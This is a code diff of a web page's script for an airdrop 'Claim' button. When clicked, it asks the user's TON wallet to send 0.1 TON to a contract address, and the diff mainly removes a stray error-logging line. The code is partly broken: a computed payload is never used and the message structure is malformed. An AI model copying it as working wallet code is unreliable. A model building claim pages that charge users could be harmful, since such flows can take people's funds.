@@ -330,49 +330,47 @@
 
         // Obsługa przycisku "Claim"
         document.getElementById('claim-button').addEventListener('click', async () => {
-            try {
-                if (!tonConnectUI.connected) {
-                    updateStatus('Please connect your wallet first', 'error');
-                    return;
+    try {
+        if (!tonConnectUI.connected) {
+            updateStatus('Please connect your wallet first', 'error');
+            return;
+        }
+
+        updateStatus('Preparing transaction...', 'info');
+        updateProgress(20);
+
+        const payloadBase64 = btoa("withdrawTON");
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [
+                {
+                    address: AIRDROP_CONTRACT_ADDRESS,
+                    amount: '100000000', // 0.1 TON (w nanotonach)
+                    payload: {
+                        payload: 'te6ccgEBAQEAAgAAAA==',
+                        bounce: true,
+                        init: null
+                    }
                 }
+            ]
+        };
 
-                updateStatus('Preparing transaction...', 'info');
-                updateProgress(20);
+        updateProgress(40);
 
-                const payloadBase64 = btoa("withdrawTON");
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log('Transaction result:', result);
 
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300,
-                    messages: [
-                        {
-                            address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '100000000', // 0.1 TON (w nanotonach)
-                            payload: {
-                                payload: 'te6ccgEBAQEAAgAAAA==',
-                                // Dodatkowe opcje zwiększające kompatybilność
-                                bounce: true,
-                                init: null
-                            }
-                        }
-                    ]
-                };
-                console.error('Transaction error:', error);
+        updateProgress(80);
+        updateStatus('Transaction sent successfully!', 'success');
+        updateProgress(100);
 
-                updateProgress(40);
-
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log('Transaction result:', result);
-
-                updateProgress(80);
-                updateStatus('Transaction sent successfully!', 'success');
-                updateProgress(100);
-
-            } catch (error) {
-                console.error('Transaction error:', error);
-                updateStatus(`Transaction error: ${error.message}`, 'error');
-                updateProgress(0);
-            }
-        });
+    } catch (error) {  // Teraz 'error' jest poprawnie zdefiniowane jako argument funkcji
+        console.error('Transaction error:', error);
+        updateStatus(`Transaction error: ${error.message}`, 'error');
+        updateProgress(0);
+    }
+});
     </script>
 </body>
 
